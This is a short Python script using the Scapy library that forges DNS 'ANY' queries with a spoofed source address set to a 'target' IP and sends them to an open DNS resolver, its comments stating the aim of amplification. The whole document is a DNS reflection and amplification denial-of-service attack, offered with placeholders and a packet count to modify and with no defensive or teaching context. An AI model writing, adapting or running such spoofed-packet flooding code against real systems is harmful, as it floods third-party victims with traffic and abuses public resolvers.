from scapy.all import *

target_ip = "8.8.8.8" # Replace with the target IP address
open_dns_resolver = "8.8.8.8" # Replace with an open DNS resolver IP
dns_query_packets = 1 # Modify as necessary

# Craft DNS query packet
dns_query = IP(src=target_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
# Send the packet multiple times for amplification
send(dns_query, count= dns_query_packets)